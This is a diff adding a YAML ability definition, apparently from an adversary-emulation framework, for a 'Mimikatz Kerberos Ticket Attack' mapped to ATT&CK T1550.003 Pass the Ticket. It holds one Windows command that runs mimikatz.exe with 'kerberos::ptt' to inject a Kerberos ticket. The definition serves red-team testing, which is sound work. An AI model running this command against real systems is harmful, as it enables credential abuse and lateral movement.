@@ -1,0 +1,17 @@
+---
+- id: cdb3eca96b0f352898a8822e109ef5b2
+  name: Mimikatz Kerberos Ticket Attack
+  description: 'Similar to PTH, but attacking Kerberos
+
+    '
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.003
+    name: 'Use Alternate Authentication Material: Pass the Ticket'
+  platforms:
+    windows:
+      cmd:
+        command: '"PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe" "kerberos::ptt
+          None"'
+        payloads: []
+        cleanup: ''
